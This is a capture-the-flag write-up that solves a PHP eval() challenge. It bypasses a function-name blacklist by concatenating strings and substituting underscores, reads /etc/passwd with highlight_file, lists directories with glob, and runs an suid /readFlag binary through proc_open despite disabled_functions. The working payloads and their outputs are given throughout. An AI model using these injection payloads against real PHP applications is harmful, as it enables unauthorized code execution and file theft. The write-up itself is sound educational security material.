## 1. Background & Setup

The objective of this challenge is to leverage `eval()` in PHP to gain code
execution while bypassing a blacklist.

From reading the source code provided, we see that the page accepts two GET
parameters: `input` and `thisfile`.

In order to reach the `eval()` code path, we can set `thisfile` to be an
existing directory name (`isfile()` will evaluate to false, and
`file_exists()` will evaluate to true).

`input` is what we wish to run in the `eval()` statement, but it must pass the
blacklist check first. The blacklist itself is a list of all internal (i.e.
built-in) function names (`get_defined_functions()['internal']`).  
  
More about ways to bypass the blacklist in a bit, but for now we can try
`/?input=echo(1);&thisfile=/etc` and observe that it works (prints `1` onto
the page)

## 2. LFD  
### 2.1 Listing files

The blacklist prevents us from using any internal functions⁽¹⁾ directly, but
we can solve this problem with a couple of tricks.

First, we can nest the commands we wish to execute inside another `eval()`,
and since `eval()` takes in a string as an argument, we can split the command
into several strings, and concatenate them.

For example, the string `phpinfo` is disallowed, but we can use
`eval("php"."info();");` as our `input` to call `phpinfo()`.

However, the list of blacklisted function names also contains an
underscore⁽²⁾, so we need to replace any underscores in our payload with
something else. The easiest way is to use a directory name for `thisfile`
which contains an underscore, and reference it through `$thisfille[*index of
underscore*]`. Alternatively, you can also prepend `$lol=eval('return
ch'.'r(0x5f);');` to your input, and replace any underscores with `$lol`.

Combining these two tricks, we can use `highlight_file()` to read arbitrary
files:

```  
/?input=eval("highlight".$thisfille[8]."fil"."e('/etc/passwd');");&thisfile=/lib/x86_64-linux-
gnu  
```  
```php  
Equivalent to: highlight_file('/etc/passwd');  
```

Searching through the usual places however
(`flag`,`flag.txt`,`flag.php`,`/flag`,…), we are unable to find the flag.
Therefore, we turn to listing directories.

### 2.2 Listing directories  

Normally, we'd accomplish this using `scandir()`, but it didn't work in this
case.

Upon closer inspection of the phpinfo dump, we find that the following
functions have been disabled:

```  
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,system,shell_exec,popen,passthru,link,symlink,syslog,imap_open,ld,error_log,mail,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir  
```

...which includes `scandir()`. This means we cannot run any of these
functions, regardless of whether we can bypass the blacklist.

However, `glob()` is not disabled, and so we can use the following⁽³⁾:

```  
/?input=eval('print'.$thisfille[8].'r(glo'.'b(\'/*\'));');&thisfile=/lib/x86_64-linux-
gnu  
```  
```  
Equivalent to: print_r(glob('/*'));  
```

which yields:

```  
Array  
(  
   [0] => /bin  
   [1] => /boot  
   [2] => /dev  
   [3] => /etc  
   [4] => /flag  
   [5] => /home  
   [6] => /initrd.img  
   [7] => /initrd.img.old  
   [8] => /lib  
   [9] => /lib64  
   [10] => /lost+found  
   [11] => /media  
   [12] => /mnt  
   [13] => /opt  
   [14] => /proc  
   [15] => /readFlag  
   [16] => /root  
   [17] => /run  
   [18] => /sbin  
   [19] => /snap  
   [20] => /srv  
   [21] => /sys  
   [22] => /tmp  
   [23] => /usr  
   [24] => /var  
   [25] => /vmlinuz  
   [26] => /vmlinuz.old  
)  
```

We see that the `/flag` file does indeed exist, even though we could not read
it before. We also see that there is a `/readFlag` file which we cannot
display the contents of either, but we can assume that this is a binary
(perhaps a suid binary) that we can run to print out the contents of `/flag`.
This is the reason the flavourtext hinted at getting a shell – we need to
execute OS commands in order solve this challenge.

## 3. OS Command Injection

Going back to the list of disabled functions, we see that nearly all functions
that we can use to execute code have been disabled. However, they left one
function enabled which allows us to execute commands: `proc_open()`.

It's not pretty, but we can use it like this to run `/readFlag`  
```  
/?input=$descr=array(0=>array('p'.'ipe','r'),1=>array('p'.'ipe','w'),2=>array('p'.'ipe','w'));$pxpes=array();$process=eval('return%20proc'.$thisfille[8].'open("/readFlag",$descr,$pxpes);');eval('echo(fge'.'ts($pxpes[1]));');&thisfile=/lib/x86_64-linux-
gnu  
```  
```php  
Equivalent to:  
$descr = array(  
   0 => array(  
       'pipe',  
       'r'  
   ) ,  
   1 => array(  
       'pipe',  
       'w'  
   ) ,  
   2 => array(  
       'pipe',  
       'w'  
   )  
);  
$pxpes = array();  
$process = proc_open("/readFlag", $descr, $pxpes);  
echo (fgets($pxpes[1]));  
```  
Output:  
```  
FLAG: inctf{That-w4s-fun-bypassing-php-waf:SpyD3r}  
```

## Appendix  
To prove our earlier hypothesis that `/readFlag` is a suid binary, we can run:  
```  
/?input=$descr=array(0=>array('p'.'ipe','r'),1=>array('p'.'ipe','w'),2=>array('p'.'ipe','w'));$pxpes=array();$process=eval('return%20proc'.$thisfille[8].'open("ls%20-l%20/readFlag",$descr,$pxpes);');eval('echo(fge'.'ts($pxpes[1]));');&thisfile=/lib/x86_64-linux-
gnu  
```  
Output:  
```  
-r-s--x--x 1 root ubuntu 8728 Sep 20 08:00 /readFlag  
```  
Observe that the suid bit has been set.

And the flag is only readable by root:  
```  
/?input=$descr=array(0=>array('p'.'ipe','r'),1=>array('p'.'ipe','w'),2=>array('p'.'ipe','w'));$pxpes=array();$process=eval('return
proc'.$thisfille[8].'open("ls -l
/flag",$descr,$pxpes);');eval('echo(fge'.'ts($pxpes[1]));');&thisfile=/lib/x86_64-linux-
gnu  
```  
Output:  
```  
-r-------- 1 root root 45 Sep 20 08:00 /flag  
```  
_____  
#### Footnotes  
1. `echo` is a language construct, not a function, which is why the internal function blacklist did not catch it in the first example  
2. In PHP, `_()` is an alias for `gettext()`  
3. `readdir()` and `opendir()` are also available, but less convenient to use since `readdir()` must be called once for each line of output